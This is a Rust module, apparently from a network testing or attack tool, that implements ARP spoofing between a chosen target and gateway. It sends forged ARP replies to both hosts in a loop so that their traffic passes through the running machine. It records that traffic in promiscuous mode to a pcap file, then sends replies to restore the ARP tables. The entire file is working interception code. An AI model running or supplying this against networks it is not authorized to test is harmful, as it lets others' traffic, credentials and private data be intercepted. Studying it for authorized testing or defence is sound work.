use std::net::Ipv4Addr;
use std::sync::Arc;
use std::time::Duration;

use pnet::util::MacAddr;
use pnet_datalink::{self, Channel};
use tokio::sync::Mutex;

use crate::commands::arp_spoof::ArpSpoofStatus;
use crate::error::AppError;
use crate::network::{arp, interface, packet};
use crate::AppState;

/// Start ARP spoofing between target and gateway.
pub async fn start(
    target_ip: &str,
    gateway_ip: &str,
    packet_count: u32,
    state: &AppState,
) -> Result<String, AppError> {
    // Check if already running
    {
        let running = state.arp_spoof_running.lock().await;
        if *running {
            return Err(AppError::ArpSpoof("ARP spoofing is already running".to_string()));
        }
    }

    let net_info = interface::get_active_network_info(&state.config.network)?;
    let interface_name = net_info.interface_name.clone();
    let timeout_ms = state.config.scan.arp_timeout_ms;
    let retry_count = state.config.scan.arp_retry_count;
    let poison_interval = state.config.scan.poison_interval_sec;
    let reset_count = state.config.scan.reset_packet_count;
    let pcap_dir = state.config.paths.pcap_output_dir.clone();
    let pcap_filename = state.config.paths.pcap_filename.clone();

    // Resolve MAC addresses
    let gateway_mac = arp::get_mac(gateway_ip, &interface_name, timeout_ms, retry_count)?
        .ok_or_else(|| {
            AppError::ArpSpoof(format!("Could not resolve MAC for gateway {}", gateway_ip))
        })?;

    let target_mac = arp::get_mac(target_ip, &interface_name, timeout_ms, retry_count)?
        .ok_or_else(|| {
            AppError::ArpSpoof(format!("Could not resolve MAC for target {}", target_ip))
        })?;

    let running_flag = state.arp_spoof_running.clone();

    // Set running
    {
        let mut running = running_flag.lock().await;
        *running = true;
    }

    let target_ip_owned = target_ip.to_string();
    let gateway_ip_owned = gateway_ip.to_string();

    // Spawn the poisoning + capture task
    tokio::spawn(async move {
        let result = run_spoof(
            &target_ip_owned,
            &target_mac,
            &gateway_ip_owned,
            &gateway_mac,
            &interface_name,
            packet_count,
            poison_interval,
            reset_count,
            &pcap_dir,
            &pcap_filename,
            running_flag.clone(),
        )
        .await;

        // Ensure flag is cleared
        let mut running = running_flag.lock().await;
        *running = false;

        if let Err(e) = result {
            log::error!("ARP spoof error: {}", e);
        }
    });

    Ok("ARP spoofing started".to_string())
}

/// Stop ARP spoofing.
pub async fn stop(state: &AppState) -> Result<ArpSpoofStatus, AppError> {
    let mut running = state.arp_spoof_running.lock().await;
    *running = false;

    Ok(ArpSpoofStatus {
        is_running: false,
        packets_captured: 0,
        pcap_path: None,
    })
}

/// Get current ARP spoof status.
pub async fn status(state: &AppState) -> Result<ArpSpoofStatus, AppError> {
    let is_running = *state.arp_spoof_running.lock().await;
    Ok(ArpSpoofStatus {
        is_running,
        packets_captured: 0,
        pcap_path: None,
    })
}

#[allow(clippy::too_many_arguments)]
async fn run_spoof(
    target_ip: &str,
    target_mac: &str,
    gateway_ip: &str,
    gateway_mac: &str,
    interface_name: &str,
    packet_count: u32,
    poison_interval_sec: u64,
    reset_count: u32,
    pcap_dir: &str,
    pcap_filename: &str,
    running: Arc<Mutex<bool>>,
) -> Result<(), AppError> {
    let target_ip_parsed: Ipv4Addr = target_ip
        .parse()
        .map_err(|e| AppError::ArpSpoof(format!("Invalid target IP: {}", e)))?;
    let gateway_ip_parsed: Ipv4Addr = gateway_ip
        .parse()
        .map_err(|e| AppError::ArpSpoof(format!("Invalid gateway IP: {}", e)))?;
    let target_mac_parsed: MacAddr = target_mac
        .parse()
        .map_err(|e| AppError::ArpSpoof(format!("Invalid target MAC: {}", e)))?;
    let gateway_mac_parsed: MacAddr = gateway_mac
        .parse()
        .map_err(|e| AppError::ArpSpoof(format!("Invalid gateway MAC: {}", e)))?;

    let interface = packet::find_interface(interface_name)
        .map_err(|_| AppError::ArpSpoof(format!("Interface '{}' not found", interface_name)))?;

    let source_mac = interface
        .mac
        .ok_or_else(|| AppError::ArpSpoof("Interface has no MAC".to_string()))?;

    // Create pcap output directory
    std::fs::create_dir_all(pcap_dir)
        .map_err(|e| AppError::ArpSpoof(format!("Cannot create pcap dir: {}", e)))?;

    let pcap_path = format!("{}/{}", pcap_dir, pcap_filename);

    // Open pcap capture
    let mut cap = pcap::Capture::from_device(interface_name)
        .map_err(|e| AppError::ArpSpoof(format!("pcap device error: {}", e)))?
        .promisc(true)
        .timeout(1000)
        .open()
        .map_err(|e| AppError::ArpSpoof(format!("pcap open error: {}", e)))?;

    let mut savefile = cap
        .savefile(&pcap_path)
        .map_err(|e| AppError::ArpSpoof(format!("pcap savefile error: {}", e)))?;

    // Poisoning loop
    let mut captured: u32 = 0;
    let config = pnet_datalink::Config {
        read_timeout: Some(Duration::from_millis(100)),
        ..Default::default()
    };

    let (mut tx, _rx) = match pnet_datalink::channel(&interface, config) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        _ => return Err(AppError::ArpSpoof("Cannot open datalink channel".to_string())),
    };

    loop {
        // Check if still running
        {
            let is_running = running.lock().await;
            if !*is_running {
                break;
            }
        }

        // Send poison packets to target (pretend to be gateway)
        packet::send_arp_reply(
            &mut tx,
            source_mac,
            gateway_ip_parsed,
            target_mac_parsed,
            target_ip_parsed,
        );

        // Send poison packets to gateway (pretend to be target)
        packet::send_arp_reply(
            &mut tx,
            source_mac,
            target_ip_parsed,
            gateway_mac_parsed,
            gateway_ip_parsed,
        );

        // Capture packets
        match cap.next_packet() {
            Ok(pkt) => {
                savefile.write(&pkt);
                captured += 1;
                if captured >= packet_count {
                    break;
                }
            }
            Err(pcap::Error::TimeoutExpired) => {}
            Err(_) => break,
        }

        tokio::time::sleep(Duration::from_secs(poison_interval_sec)).await;
    }

    savefile.flush().map_err(|e| AppError::ArpSpoof(format!("pcap flush error: {}", e)))?;

    // Reset ARP tables
    for _ in 0..reset_count {
        // Restore target's ARP: gateway is at gateway_mac
        packet::send_arp_reply(
            &mut tx,
            gateway_mac_parsed,
            gateway_ip_parsed,
            target_mac_parsed,
            target_ip_parsed,
        );
        // Restore gateway's ARP: target is at target_mac
        packet::send_arp_reply(
            &mut tx,
            target_mac_parsed,
            target_ip_parsed,
            gateway_mac_parsed,
            gateway_ip_parsed,
        );
    }

    Ok(())
}
